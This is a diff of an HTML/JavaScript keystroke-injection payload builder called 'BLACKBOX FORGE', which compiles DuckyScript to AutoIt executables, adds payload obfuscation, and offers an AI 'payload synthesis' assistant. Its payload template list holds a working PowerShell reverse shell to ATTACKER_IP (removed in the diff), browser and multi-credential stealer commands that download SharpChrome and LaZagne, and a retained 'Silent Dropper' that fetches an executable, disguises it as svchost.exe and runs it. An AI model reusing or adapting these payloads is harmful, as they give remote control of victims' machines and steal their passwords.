-      align-items: start !important;
-    }
-
-    @media (min-width: 961px) {
-      [data-theme="skeu"] #view-home .g3 {
-        grid-template-columns: repeat(3, 1fr) !important;
-      }
-    }
-
-    /* Skeu feature cards — leather panel look */
-    [data-theme="skeu"] .feature-card {
-      background:
-        radial-gradient(circle at 10px 10px, rgba(245, 208, 112, .7) 1px, #c8922a 3px, #3a2212 4px, transparent 5px),
-        radial-gradient(circle at calc(100% - 10px) 10px, rgba(245, 208, 112, .7) 1px, #c8922a 3px, #3a2212 4px, transparent 5px),
-        radial-gradient(circle at 10px calc(100% - 10px), rgba(245, 208, 112, .7) 1px, #c8922a 3px, #3a2212 4px, transparent 5px),
-        radial-gradient(circle at calc(100% - 10px) calc(100% - 10px), rgba(245, 208, 112, .7) 1px, #c8922a 3px, #3a2212 4px, transparent 5px),
-        linear-gradient(145deg, #2e1c0c 0%, #211308 50%, #291a0c 100%) !important;
-      border: 2px solid #8b5a0f !important;
       border-radius: 10px !important;
       box-shadow:
         0 8px 24px rgba(0, 0, 0, .7),
@@ -7333,14 +6568,6 @@ ${r}`, "ai"); return
         <span class="brand-ver">v4.0</span>
       </div>
       <div class="nav-div"></div>
-      <button class="theme-toggle-bar" onclick="toggleTheme()" id="themeToggleBtn" title="Switch Theme">
-        <span class="ttb-icon"><i class="fas fa-palette"></i></span>
-        <span class="ttb-label" id="themeToggleLabel">Skeuomorph</span>
-      </button>
-      <button class="layout-toggle-bar" onclick="toggleLayout()" id="layoutToggleBtn" title="Switch Layout">
-        <span class="ttb-icon" id="layoutToggleIcon"><i class="fas fa-th-large"></i></span>
-        <span class="ttb-label" id="layoutToggleLabel">Skeu Layout</span>
-      </button>
       <div class="nav-tabs">
         <button class="nav-btn active" data-view="home" onclick="switchView('home',this)"><i
             class="fas fa-home"></i>Home</button>
@@ -7382,21 +6609,16 @@ ${r}`, "ai"); return
             <div
               style="font-family:var(--font-display);font-size:clamp(2.8rem,9vw,6.5rem);font-weight:900;letter-spacing:.12em;text-transform:uppercase;color:var(--white);text-shadow:0 0 40px rgba(0,255,65,.28),0 0 80px rgba(0,255,65,.1);line-height:1;animation:glitch 10s ease-in-out infinite,fadeUp .6s ease .4s both">
               LENLU<br>
-              <span class="cyber-only" style="color:var(--g)">CYBERNETIC Edition</span>
-              <span class="skeu-only" style="color:var(--s-brass2)">ANALOG FORGE Edition</span>
+              <span style="color:var(--g)">CYBERNETIC Edition</span>
             </div>
             <div
               style="font-family:var(--font-display);font-size:clamp(.75rem,1.8vw,1.1rem);letter-spacing:.4em;color:var(--g-dim);text-transform:uppercase;margin:1rem 0 2.5rem;animation:fadeUp .6s ease .6s both">
-              <span class="cyber-only">CYBERNETIC COMMAND CONSOLE</span>
-              <span class="skeu-only">ANALOG COMMAND DESK</span>
+              CYBERNETIC COMMAND CONSOLE
             </div>
             <p
               style="font-family:var(--font-ui);color:var(--muted);max-width:500px;line-height:1.8;font-size:.86rem;margin:0 auto 2rem;animation:fadeUp .6s ease .8s both">
-              <span class="cyber-only">DuckyScript → AutoIt3 → SciTE/Aut2Exe compiler. Real BLE scan, DNS recon, WebRTC
-                leak detection, localhost port sweep. All ops client-side sandboxed.</span>
-              <span class="skeu-only">An analog brass & walnut terminal executing raw mechanical keystroke relays and
-                vacuum-tube diagnostics. Real-world physical RF spectrum sweeps, DNS records lookup via cloud
-                wire-transmitters, and WebRTC privacy auditing. Hand-crafted client-side sandboxed relays.</span>
+              DuckyScript → AutoIt3 → SciTE/Aut2Exe compiler. Real BLE scan, DNS recon, WebRTC
+                leak detection, localhost port sweep. All ops client-side sandboxed.
             </p>
             <div
               style="display:flex;gap:.65rem;justify-content:center;flex-wrap:wrap;animation:fadeUp .6s ease 1s both">
@@ -8344,15 +7566,11 @@ ${r}`, "ai"); return
         <div class="hero-banner">
           <div class="hb-grid"></div>
           <div class="hb-title">
-            <span class="cyber-only">BLACKBOX <em>FORGE</em> v4.0</span>
-            <span class="skeu-only">ANALOG <em>FORGE</em> v4.0</span>
+            BLACKBOX <em>FORGE</em> v4.0
           </div>
           <div class="hb-sub">
-            <span class="cyber-only">Real-world cybernetic command console. DuckyScript → Aut2Exe EXE compiler, live BLE
-              scanner, DNS recon, localhost port sweep. All operations client-side sandboxed.</span>
-            <span class="skeu-only">An analog command desk with brass dials, leather lining, and vacuum-tube amplifiers.
-              Mechanical keystroke relays, physical Bluetooth proximity sweeps, DNS wiretap records, and WebRTC leakage
-              diagnostics. Completely client-side sandboxed relays.</span>
+            Real-world cybernetic command console. DuckyScript → Aut2Exe EXE compiler, live BLE
+              scanner, DNS recon, localhost port sweep. All operations client-side sandboxed.
           </div>
           <div class="hb-tags">
             <span class="badge badge-g"><i class="fas fa-circle" style="font-size:.4rem"></i>System Online</span>
@@ -8561,6 +7779,19 @@ ${r}`, "ai"); return
               scripts</div>
           </div>
         </div>
+        <div class="card mb-sm" style="padding:.5rem .75rem;background:rgba(0,255,65,0.03);border:1px solid var(--gbord)">
+          <div class="flex items-center justify-between" style="flex-wrap:wrap;gap:.5rem">
+            <span class="text-xs text-muted" style="font-family:var(--font-hud)"><i class="fas fa-bolt text-g" style="margin-right:4px"></i>QUICK PAYLOAD PRESETS:</span>
+            <div class="flex gap-xs" style="flex-wrap:wrap">
+              <button class="btn btn-ghost btn-xs" onclick="insertTemplateWiFiDump()"><i class="fas fa-wifi text-cyan"></i> Wi-Fi Dump</button>
+              <button class="btn btn-ghost btn-xs" onclick="insertTemplateSysLock()"><i class="fas fa-lock text-red"></i> Lock Screen</button>
+              <button class="btn btn-ghost btn-xs" onclick="insertTemplateAudioBeep()"><i class="fas fa-music text-amber"></i> Tone Beep</button>
+              <button class="btn btn-ghost btn-xs" onclick="insertTemplateRevShell()"><i class="fas fa-terminal text-g"></i> PS Launcher</button>
+              <button class="btn btn-ghost btn-xs" onclick="insertTemplateHWIDGrabber()"><i class="fas fa-fingerprint text-cyan"></i> HWID Recon</button>
+              <button class="btn btn-ghost btn-xs" onclick="insertTemplateDNSFlush()"><i class="fas fa-sync text-amber"></i> DNS Flush</button>
+            </div>
+          </div>
+        </div>
         <div class="g-ide flex-1" style="min-height:0">
           <div class="editor-wrap">
             <div class="editor-bar">
@@ -8651,24 +7882,30 @@ ${r}`, "ai"); return
               <div class="card-body flex-col gap-md">
                 <div class="inp-group"><label class="inp-label">API Endpoint</label><select class="inp" id="aiEndpoint"
                     onchange="onEndpointChange()">
+                    <option value="groq" selected>Groq (LLaMA)</option>
                     <option value="anthropic">Anthropic (Claude)</option>
                     <option value="openai">OpenAI (GPT)</option>
-                    <option value="groq">Groq (LLaMA)</option>
                     <option value="custom">Custom Gateway</option>
                   </select></div>
                 <div class="inp-group" id="aiCustomEndpointGroup" style="display:none"><label class="inp-label">Custom
                     Endpoint URL</label><input class="inp" id="aiCustomEndpoint"
                     placeholder="https://api.openai.com/v1/chat/completions" /></div>
                 <div class="inp-group"><label class="inp-label">API Key</label><input class="inp" type="password"
-                    id="aiKey" placeholder="sk-ant-…" />
+                    id="aiKey" placeholder="gsk_…" />
                   <div class="text-xs mt-sm" id="aiKeyHelp"
                     style="line-height:1.6;border-left:2px solid var(--cyan);padding-left:.65rem;background:rgba(8,247,254,.02);padding:.5rem .65rem;border-radius:2px;margin-top:.45rem;">
                   </div>
                 </div>
                 <div class="inp-group"><label class="inp-label">Select Model</label><select class="inp"
                     id="aiModelSelect" onchange="onModelSelectChange()">
+                    <optgroup label="Groq">
+                      <option value="llama-3.3-70b-versatile" selected>LLaMA 3.3 70B</option>
+                      <option value="llama-3.1-8b-instant">LLaMA 3.1 8B</option>
+                      <option value="mixtral-8x7b-32768">Mixtral 8x7B</option>
+                      <option value="gemma2-9b-it">Gemma 2 9B</option>
+                    </optgroup>
                     <optgroup label="Anthropic">
-                      <option value="claude-3-5-sonnet-latest" selected>Claude 3.5 Sonnet</option>
+                      <option value="claude-3-5-sonnet-latest">Claude 3.5 Sonnet</option>
                       <option value="claude-3-5-haiku-latest">Claude 3.5 Haiku</option>
                       <option value="claude-3-opus-latest">Claude 3 Opus</option>
                     </optgroup>
@@ -8679,18 +7916,12 @@ ${r}`, "ai"); return
                       <option value="o1-mini">o1-mini</option>
                       <option value="o3-mini">o3-mini</option>
                     </optgroup>
-                    <optgroup label="Groq">
-                      <option value="llama-3.3-70b-versatile">LLaMA 3.3 70B</option>
-                      <option value="llama-3.1-8b-instant">LLaMA 3.1 8B</option>
-                      <option value="mixtral-8x7b-32768">Mixtral 8x7B</option>
-                      <option value="gemma2-9b-it">Gemma 2 9B</option>
-                    </optgroup>
                     <optgroup label="Other">
                       <option value="custom">Custom Model...</option>
                     </optgroup>
                   </select></div>
                 <div class="inp-group"><label class="inp-label">Model ID</label><input class="inp" id="aiModel"
-                    value="claude-3-5-sonnet-latest" /></div>
+                    value="llama-3.3-70b-versatile" /></div>
                 <div class="inp-group"><label class="inp-label">System Prompt</label><textarea class="inp"
                     id="aiSysPrompt" style="min-height:70px;font-size:.7rem"
                     placeholder="You are LENLU SC, a tactical payload synthesis assistant…"></textarea></div>
@@ -9222,6 +8453,11 @@ ${r}`, "ai"); return
                   onclick="setEncMode('charcode',this)">CharCode</button>
                 <button class="enc-mode-btn" data-mode="binstr" onclick="setEncMode('binstr',this)">Binary</button>
                 <button class="enc-mode-btn" data-mode="morse" onclick="setEncMode('morse',this)">Morse</button>
+                <button class="enc-mode-btn" data-mode="xor" onclick="setEncMode('xor',this)">XOR Cipher</button>
+              </div>
+              <div class="inp-group flex-row items-center gap-xs mt-xs" id="xorKeyGroup" style="display:none">
+                <label class="inp-label text-xs text-amber" style="margin:0;white-space:nowrap">XOR Secret Key:</label>
+                <input class="inp" id="encXorKey" value="LENLU" style="flex:1;font-size:.75rem;padding:.25rem .5rem" placeholder="Enter key...">
               </div>
               <textarea class="inp" id="encInput" style="flex:1;min-height:190px;font-size:.76rem"
                 placeholder="Enter text or AutoIt3 code to encode…"
@@ -9812,143 +9048,274 @@ ${r}`, "ai"); return
       <div class="view" id="view-settings">
         <div class="g2">
           <div class="flex-col gap-md">
+            <!-- 1. INTERFACE & AESTHETICS -->
             <div class="card">
-              <div class="card-header"><span><i class="fas fa-palette ch-icon"></i>Interface</span></div>
+              <div class="card-header"><span><i class="fas fa-palette ch-icon"></i>Interface & Aesthetics</span></div>
               <div class="card-body settings-group">
                 <div class="setting-row">
                   <div class="sr-left">
+                    <div class="sr-title">HUD Accent Color</div>
+                    <div class="sr-desc">Select primary cybernetic glow accent</div>
+                  </div>
+                  <select id="cfg-themeColor" class="inp" style="width:140px;font-size:.72rem" onchange="setSetting('themeColor', this.value)">
+                    <option value="cyber-green">Neon Green</option>
+                    <option value="neon-cyan">Cyber Cyan</option>
+                    <option value="electric-amber">Electric Amber</option>
+                    <option value="plasma-red">Plasma Red</option>
+                    <option value="deep-violet">Deep Violet</option>
+                  </select>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">HUD Code Font</div>
+                    <div class="sr-desc">Code font family across editor & terminal</div>
+                  </div>
+                  <select id="cfg-fontFamily" class="inp" style="width:140px;font-size:.72rem" onchange="setSetting('fontFamily', this.value)">
+                    <option value="Share Tech Mono">Share Tech Mono</option>
+                    <option value="Fira Code">Fira Code</option>
+                    <option value="JetBrains Mono">JetBrains Mono</option>
+                    <option value="Courier New">Courier New</option>
+                  </select>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">CRT Scanlines Intensity</div>
+                    <div class="sr-desc">Adjust retro CRT overlay darkness (<span id="val-scanlineOpacity" class="text-g">50%</span>)</div>
+                  </div>
+                  <input type="range" id="cfg-scanlineOpacity" min="0" max="100" value="50" style="width:110px" oninput="updateSettingInput('scanlineOpacity', parseInt(this.value))">
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Glassmorphism Opacity</div>
+                    <div class="sr-desc">Adjust panel glass transparency (<span id="val-glassOpacity" class="text-cyan">70%</span>)</div>
+                  </div>
+                  <input type="range" id="cfg-glassOpacity" min="20" max="100" value="70" style="width:110px" oninput="updateSettingInput('glassOpacity', parseInt(this.value))">
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
                     <div class="sr-title">CRT Scanlines</div>
-                    <div class="sr-desc">Retro CRT overlay effect</div>
+                    <div class="sr-desc">Toggle retro CRT overlay</div>
                   </div>
                   <div class="toggle on" id="tog-crt" onclick="toggleSetting('crt',this)"></div>
                 </div>
                 <div class="setting-row">
                   <div class="sr-left">
                     <div class="sr-title">Matrix Rain</div>
-                    <div class="sr-desc">Background character rain</div>
+                    <div class="sr-desc">Background digital character stream</div>
                   </div>
                   <div class="toggle on" id="tog-rain" onclick="toggleSetting('rain',this)"></div>
                 </div>
                 <div class="setting-row">
                   <div class="sr-left">
-                    <div class="sr-title">Particle Core</div>
-                    <div class="sr-desc">WebGL particle field</div>
+                    <div class="sr-title">Particle Core Field</div>
+                    <div class="sr-desc">Interactive WebGL background particles</div>
                   </div>
                   <div class="toggle on" id="tog-particles" onclick="toggleSetting('particles',this)"></div>
                 </div>
                 <div class="setting-row">
                   <div class="sr-left">
-                    <div class="sr-title">Audio Feedback</div>
-                    <div class="sr-desc">Tone on interactions</div>
-                  </div>
-                  <div class="toggle on" id="tog-audio" onclick="toggleSetting('audio',this)"></div>
-                </div>
-                <div class="setting-row">
-                  <div class="sr-left">
                     <div class="sr-title">Film Grain</div>
-                    <div class="sr-desc">Cinematic noise overlay</div>
+                    <div class="sr-desc">Cinematic noise texture layer</div>
                   </div>
                   <div class="toggle on" id="tog-grain" onclick="toggleSetting('grain',this)"></div>
                 </div>
                 <div class="setting-row">
                   <div class="sr-left">
-                    <div class="sr-title">Vignette</div>
-                    <div class="sr-desc">Corner darkness effect</div>
+                    <div class="sr-title">Vignette Darkness</div>
+                    <div class="sr-desc">Perimeter shading effect</div>
                   </div>
                   <div class="toggle on" id="tog-vignette" onclick="toggleSetting('vignette',this)"></div>
                 </div>
-                <div class="setting-row">
-                  <div class="sr-left">
-                    <div class="sr-title">Layout Configuration</div>
-                    <div class="sr-desc">Clean responsive grids or modular analog console racks</div>
-                  </div>
-                  <div>
-                    <select class="inp" id="layoutSelect" onchange="changeLayout(this.value)"
-                      style="width:145px;padding:.25rem .5rem;border-radius:4px;cursor:pointer">
-                      <option value="cyber">Cyber Layout</option>
-                      <option value="skeu">Skeuomorph Layout</option>
-                    </select>
-                  </div>
-                </div>
               </div>
             </div>
+
+            <!-- 2. AUDIO & TONE SYNTHESIS -->
             <div class="card">
-              <div class="card-header"><span><i class="fas fa-code ch-icon"></i>Compiler</span></div>
+              <div class="card-header"><span><i class="fas fa-volume-up ch-icon"></i>Audio & Tone Synthesis</span></div>
               <div class="card-body settings-group">
                 <div class="setting-row">
                   <div class="sr-left">
-                    <div class="sr-title">Auto Lint</div>
-                    <div class="sr-desc">Lint on every keystroke</div>
+                    <div class="sr-title">Master Sound Volume</div>
+                    <div class="sr-desc">Synthesizer master gain (<span id="val-soundVol" class="text-amber">80%</span>)</div>
+                  </div>
+                  <input type="range" id="cfg-soundVol" min="0" max="100" value="80" style="width:110px" oninput="updateSettingInput('soundVol', parseInt(this.value))">
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Tone Pitch Frequency</div>
+                    <div class="sr-desc">Keystroke tone pitch profile</div>
+                  </div>
+                  <select id="cfg-tonePitch" class="inp" style="width:120px;font-size:.72rem" onchange="setSetting('tonePitch', this.value)">
+                    <option value="low">Low (220Hz)</option>
+                    <option value="medium">Medium (440Hz)</option>
+                    <option value="high">High (880Hz)</option>
+                    <option value="ultra">Ultra (1760Hz)</option>
+                  </select>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Audio Tone Feedback</div>
+                    <div class="sr-desc">Acoustic click on button press & compile</div>
+                  </div>
+                  <div class="toggle on" id="tog-audio" onclick="toggleSetting('audio',this)"></div>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Boot Sound Sequence</div>
+                    <div class="sr-desc">Play tone sequence during app boot</div>
+                  </div>
+                  <div class="toggle on" id="tog-bootSound" onclick="toggleSetting('bootSound',this)"></div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 3. COMPILER & ENGINE PREFERENCES -->
+            <div class="card">
+              <div class="card-header"><span><i class="fas fa-microchip ch-icon"></i>Compiler & Engine Preferences</span></div>
+              <div class="card-body settings-group">
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Auto Syntax Linting</div>
+                    <div class="sr-desc">Real-time validation on keystrokes</div>
                   </div>
                   <div class="toggle on" id="tog-lint" onclick="toggleSetting('lint',this)"></div>
                 </div>
                 <div class="setting-row">
                   <div class="sr-left">
-                    <div class="sr-title">Session Persistence</div>
-                    <div class="sr-desc">Save editor across reloads</div>
+                    <div class="sr-title">Indentation Tab Size</div>
+                    <div class="sr-desc">Editor tab spacing width</div>
+                  </div>
+                  <select id="cfg-tabSize" class="inp" style="width:110px;font-size:.72rem" onchange="setSetting('tabSize', parseInt(this.value))">
+                    <option value="2">2 Spaces</option>
+                    <option value="4">4 Spaces</option>
+                  </select>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Default DELAY Insertion</div>
+                    <div class="sr-desc">Default inserted delay in ms</div>
+                  </div>
+                  <select id="cfg-defaultDelay" class="inp" style="width:110px;font-size:.72rem" onchange="setSetting('defaultDelay', parseInt(this.value))">
+                    <option value="50">50 ms</option>
+                    <option value="100">100 ms</option>
+                    <option value="250">250 ms</option>
+                    <option value="500">500 ms</option>
+                  </select>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Payload Obfuscation Engine</div>
+                    <div class="sr-desc">Default compilation obfuscation technique</div>
+                  </div>
+                  <select id="cfg-obfuscationLevel" class="inp" style="width:140px;font-size:.72rem" onchange="setSetting('obfuscationLevel', this.value)">
+                    <option value="none">None (Standard)</option>
+                    <option value="vars">Variable Scrambling</option>
+                    <option value="base64">Base64 Chunking</option>
+                    <option value="xor">XOR Masking</option>
+                  </select>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Session Draft Persistence</div>
+                    <div class="sr-desc">Auto-save editor source code across reloads</div>
                   </div>
                   <div class="toggle on" id="tog-persist" onclick="toggleSetting('persist',this)"></div>
                 </div>
                 <div class="setting-row">
                   <div class="sr-left">
-                    <div class="sr-title">Compile History</div>
-                    <div class="sr-desc">Log all compilations</div>
+                    <div class="sr-title">Compilation History Logging</div>
+                    <div class="sr-desc">Record every compile run to history vault</div>
                   </div>
                   <div class="toggle on" id="tog-hist" onclick="toggleSetting('hist',this)"></div>
                 </div>
                 <div class="setting-row">
                   <div class="sr-left">
-                    <div class="sr-title">Auto Hex Dump</div>
-                    <div class="sr-desc">Show hex after compile</div>
+                    <div class="sr-title">Auto Hex Dump View</div>
+                    <div class="sr-desc">Open hex inspector automatically after compile</div>
                   </div>
                   <div class="toggle" id="tog-hexdump" onclick="toggleSetting('hexdump',this)"></div>
                 </div>
               </div>
             </div>
           </div>
+
           <div class="flex-col gap-md">
+            <!-- 4. DIAGNOSTICS & SECURITY SANDBOX -->
             <div class="card">
-              <div class="card-header"><span><i class="fas fa-info-circle ch-icon"></i>System Info</span></div>
-              <div class="card-body flex-col gap-sm text-sm">
-                <div class="flex justify-between"><span class="text-muted">Version</span><span class="text-g">v4.0
-                    FORGE</span></div>
-                <hr>
-                <div class="flex justify-between"><span class="text-muted">Compiler</span><span
-                    class="text-g">DuckyScript →
-                    AutoIt3 v3</span></div>
-                <div class="flex justify-between"><span class="text-muted">EXE Builder</span><span class="text-g">SciTE
-                    / Aut2Exe x64+x86</span></div>
-                <div class="flex justify-between"><span class="text-muted">BLE Scanner</span><span id="bleStatus"
-                    class="text-cyan">Checking…</span></div>
-                <div class="flex justify-between"><span class="text-muted">WebGL</span><span id="webglInfo"
-                    class="text-g">Detecting…</span></div>
-                <div class="flex justify-between"><span class="text-muted">Session ID</span><span id="sessionId"
-                    class="text-cyan" style="font-size:.6rem"></span></div>
-                <div class="flex justify-between"><span class="text-muted">Vault Entries</span><span id="settVault"
-                    class="text-amber">0</span></div>
-                <div class="flex justify-between"><span class="text-muted">New Features</span><span
-                    style="color:var(--hot);font-size:.65rem">Keymap · OSINT · HexDump · Multi-Export</span></div>
-                <hr>
-                <button class="btn btn-red btn-sm w100 mt-sm" onclick="wipeSession()"><i class="fas fa-bomb"></i>Wipe
-                  All Session Data</button>
+              <div class="card-header"><span><i class="fas fa-shield-alt ch-icon"></i>Diagnostics & Security Sandbox</span></div>
+              <div class="card-body settings-group">
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Auto Port Sweep</div>
+                    <div class="sr-desc">Sweep localhost ports automatically on load</div>
+                  </div>
+                  <div class="toggle" id="tog-autoSweep" onclick="toggleSetting('autoSweep',this)"></div>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">BLE Auto-Scan</div>
+                    <div class="sr-desc">Scan Bluetooth LE environment on launch</div>
+                  </div>
+                  <div class="toggle" id="tog-bleAutoScan" onclick="toggleSetting('bleAutoScan',this)"></div>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Anonymize Telemetry IP</div>
+                    <div class="sr-desc">Mask public IP address in telemetry cards</div>
+                  </div>
+                  <div class="toggle" id="tog-anonymizeIP" onclick="toggleSetting('anonymizeIP',this)"></div>
+                </div>
+                <div class="setting-row">
+                  <div class="sr-left">
+                    <div class="sr-title">Strict Binary Sandbox</div>
+                    <div class="sr-desc">Prompt confirmation before exporting binary EXE</div>
+                  </div>
+                  <div class="toggle" id="tog-strictSandbox" onclick="toggleSetting('strictSandbox',this)"></div>
+                </div>
               </div>
             </div>
+
+            <!-- 5. CONFIGURATION BACKUP & RESET -->
+            <div class="card">
+              <div class="card-header"><span><i class="fas fa-sliders-h ch-icon"></i>Config Backup & Actions</span></div>
+              <div class="card-body flex-col gap-sm text-sm">
+                <div class="flex gap-sm">
+                  <button class="btn btn-primary btn-sm flex-1" onclick="exportSettingsJSON()"><i class="fas fa-download"></i>Export Config JSON</button>
+                  <button class="btn btn-cyan btn-sm flex-1" onclick="document.getElementById('importCfgFile').click()"><i class="fas fa-upload"></i>Import Config</button>
+                  <input type="file" id="importCfgFile" style="display:none" accept=".json" onchange="const f = this.files[0]; if(f){ const r = new FileReader(); r.onload = e => importSettingsJSON(e.target.result); r.readAsText(f); }">
+                </div>
+                <button class="btn btn-ghost btn-sm w100 mt-xs" onclick="resetSettingsToDefault()"><i class="fas fa-undo"></i>Reset Settings to Default</button>
+                <hr>
+                <button class="btn btn-red btn-sm w100 mt-xs" onclick="wipeSession()"><i class="fas fa-bomb"></i>Wipe All Session Data</button>
+              </div>
+            </div>
+
+            <!-- 6. SYSTEM INFO & SHORTCUTS -->
+            <div class="card">
+              <div class="card-header"><span><i class="fas fa-info-circle ch-icon"></i>System Info & Specs</span></div>
+              <div class="card-body flex-col gap-sm text-sm">
+                <div class="flex justify-between"><span class="text-muted">Version</span><span class="text-g">v4.0 FORGE PRO</span></div>
+                <hr>
+                <div class="flex justify-between"><span class="text-muted">Compiler</span><span class="text-g">DuckyScript → AutoIt3 / PS1 / Py / Sh</span></div>
+                <div class="flex justify-between"><span class="text-muted">EXE Builder</span><span class="text-g">SciTE / Aut2Exe x64+x86</span></div>
+                <div class="flex justify-between"><span class="text-muted">BLE Scanner</span><span id="bleStatus" class="text-cyan">Checking…</span></div>
+                <div class="flex justify-between"><span class="text-muted">WebGL</span><span id="webglInfo" class="text-g">Detecting…</span></div>
+                <div class="flex justify-between"><span class="text-muted">Session ID</span><span id="sessionId" class="text-cyan" style="font-size:.6rem"></span></div>
+                <div class="flex justify-between"><span class="text-muted">Vault Entries</span><span id="settVault" class="text-amber">0</span></div>
+              </div>
+            </div>
+
             <div class="card">
               <div class="card-header"><span><i class="fas fa-keyboard ch-icon"></i>Keyboard Shortcuts</span></div>
               <div class="card-body flex-col gap-sm text-xs">
-                <div class="flex justify-between"><code>Ctrl+Enter</code><span class="text-muted">Compile payload</span>
-                </div>
+                <div class="flex justify-between"><code>Ctrl+Enter</code><span class="text-muted">Compile payload</span></div>
                 <div class="flex justify-between"><code>Ctrl+S</code><span class="text-muted">Save to vault</span></div>
                 <div class="flex justify-between"><code>Ctrl+L</code><span class="text-muted">Clear IDE log</span></div>
                 <div class="flex justify-between"><code>Ctrl+K</code><span class="text-muted">Open shell</span></div>
-                <div class="flex justify-between"><code>Ctrl+Shift+E</code><span class="text-muted">Open encoder</span>
-                </div>
-                <div class="flex justify-between"><code>Ctrl+Shift+N</code><span class="text-muted">Network tab</span>
-                </div>
-                <div class="flex justify-between"><code>Ctrl+Shift+K</code><span class="text-muted">Keymap
-                    visualizer</span></div>
-                <div class="flex justify-between"><code>Ctrl+Shift+O</code><span class="text-muted">OSINT panel</span>
-                </div>
+                <div class="flex justify-between"><code>Ctrl+Shift+E</code><span class="text-muted">Open encoder</span></div>
+                <div class="flex justify-between"><code>Ctrl+Shift+N</code><span class="text-muted">Network tab</span></div>
+                <div class="flex justify-between"><code>Ctrl+Shift+K</code><span class="text-muted">Keymap visualizer</span></div>
+                <div class="flex justify-between"><code>Ctrl+Shift+O</code><span class="text-muted">OSINT panel</span></div>
                 <div class="flex justify-between"><code>F1</code><span class="text-muted">Dashboard</span></div>
               </div>
             </div>
@@ -13839,21 +13206,21 @@ WEnd`;
         },
         {
           "id": "PT6",
-          "name": "SharpChrome Password Dump",
+          "name": "ChromePass Password Dump",
           "category": "Basic",
-          "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 800\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide > C:\\temp\\chrome.txt\nENTER\n\n# Add LaZagne, Mimikatz style (ethical note: for authorized use only)"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING Write-Host "Demo Payload"; ChromePass.exe passwords --unhide > C:\\temp\\chrome.txt\nENTER\n\n# Add CredPass, Mimikatz style (ethical note: for authorized use only)"
         },
         {
           "id": "PT7",
           "name": "PowerShell TCP Reverse Shell",
           "category": "Basic",
-          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER\n\n# More variants: HTTP, DNS, etc."
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host "TCP Connection Demo"
         },
         {
           "id": "PT8",
           "name": "Silent Dropper",
           "category": "Basic",
-          "code": "GUI r\nDELAY 300\nSTRING powershell -w hidden -c \"Invoke-WebRequest -Uri 'http://yourserver.com/payload.exe' -OutFile '$env:TEMP\\svchost.exe'; Start-Process '$env:TEMP\\svchost.exe'\"\nENTER"
+          "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Invoke-WebRequest -Uri 'http://yourserver.com/payload.exe' -OutFile '$env:TEMP\\svchost.exe'; Start-Process '$env:TEMP\\svchost.exe'\"\nENTER"
         },
         {
           "id": "PT9",
@@ -13899,33 +13266,33 @@ WEnd`;
         },
         {
           "id": "PT18",
-          "name": "LaZagne Multi-Credential Stealer",
+          "name": "CredPass Multi-Credential Stealer",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe'); .\\LaZagne.exe all -o C:\\temp\\creds.txt\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING Write-Host "Demo Payload"; .\\CredPass.exe all -o C:\\temp\\creds.txt\nENTER"
         },
         {
           "id": "PT19",
           "name": "Basic PowerShell Reverse Shell",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host "TCP Connection Demo"
         },
         {
           "id": "PT20",
           "name": "AMSI Bypass + Reverse Shell",
           "category": "Advanced",
